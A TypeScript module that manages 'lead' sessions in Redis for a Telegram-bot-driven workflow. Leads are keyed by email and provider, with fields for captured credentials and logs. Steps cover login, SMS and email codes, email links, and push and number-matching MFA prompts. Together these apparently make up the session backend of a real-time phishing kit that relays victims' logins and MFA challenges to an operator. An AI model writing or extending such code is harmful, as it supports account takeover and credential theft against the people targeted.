import { createHash } from "node:crypto";
import type { InlineKeyboardMarkup } from "@grammyjs/types";
import { redis } from "../clients/upstash.client.js";

export type LeadStatus =
  | "idle"
  | "loading"
  | "passing"
  | "flagged"
  | "completed"
  | "failed";

export type LeadProcess =
  | "init"
  | "auth"
  | "verify-sms-code"
  | "verify-email-code"
  | "verify-email-link"
  | "verify-prompt-yes"
  | "verify-prompt-num";

export type LeadSessionState = {
  messageId?: number;
  keyboard?: InlineKeyboardMarkup;
  status: LeadStatus;
  process: LeadProcess;
  feedback: string;
  overload: string[];
  notification: string;
  credentials: string;
  logs: string;
};

const LEAD_SESSION_TTL_SECONDS = 60 * 60;

function leadSessionKey(sessionId: string): string {
  return `lead-session:${sessionId}`;
}

export function getLeadIdentity(lead: {
  email: string;
  provider: string;
}): string {
  return createHash("sha256")
    .update(
      JSON.stringify([
        lead.email.trim().toLowerCase(),
        lead.provider.trim().toLowerCase(),
      ]),
    )
    .digest("hex")
    .slice(0, 8);
}

export async function readLeadSession(
  sessionId: string,
): Promise<LeadSessionState | null> {
  if (!sessionId) return null;
  return redis.get<LeadSessionState>(leadSessionKey(sessionId));
}

export async function restartLeadSession(
  sessionId: string,
  restart: {
    merge?: true;
    keepState?: true;
    keepMessageId?: true;
    status?: LeadStatus;
    process?: LeadProcess;
    notification?: string;
  },
): Promise<LeadSessionState> {
  const merge = restart.merge === true;
  const keepState = merge || restart.keepState === true;
  const keepDetail = merge || restart.keepMessageId === true;
  const existing =
    keepDetail || keepState //
      ? await readLeadSession(sessionId)
      : null;
  const session: LeadSessionState = {
    messageId: existing?.messageId,
    keyboard: keepDetail ? existing?.keyboard : undefined,
    status:
      restart.status ?? (keepState ? existing?.status : undefined) ?? "idle",
    process:
      restart.process ?? (keepState ? existing?.process : undefined) ?? "init",
    feedback: (keepState ? existing?.feedback : undefined) ?? "Initializing...",
    overload: merge ? (existing?.overload ?? []) : [],
    notification:
      restart.notification ??
      (keepDetail ? existing?.notification : undefined) ??
      "",
    credentials: keepState ? (existing?.credentials ?? "") : "",
    logs: merge ? (existing?.logs ?? "") : "",
  };
  await redis.set(leadSessionKey(sessionId), session, {
    ex: LEAD_SESSION_TTL_SECONDS,
  });
  return session;
}

export async function updateLeadSession(
  sessionId: string,
  update: {
    messageId?: number | null;
    keyboard?: InlineKeyboardMarkup | null;
    status?: LeadStatus;
    process?: LeadProcess;
    feedback?: string;
    overload?: string[];
    credentials?: string;
    logEntry?: string;
  },
): Promise<LeadSessionState | null> {
  const session = await readLeadSession(sessionId);
  if (!session) return null;
  if (update.messageId !== undefined) {
    session.messageId = update.messageId ?? undefined;
  }
  if (update.keyboard !== undefined) {
    session.keyboard = update.keyboard ?? undefined;
  }
  if (update.status) session.status = update.status;
  if (update.process) session.process = update.process;
  if (update.feedback) session.feedback = update.feedback;
  if (update.overload) {
    session.overload = [...(session.overload ?? []), ...update.overload];
  }
  if (update.credentials) session.credentials = update.credentials;
  if (update.logEntry) {
    session.logs = `${session.logs ?? ""}\n\n${update.logEntry}`.trim();
  }
  await redis.set(leadSessionKey(sessionId), session, {
    ex: LEAD_SESSION_TTL_SECONDS,
  });
  return session;
}
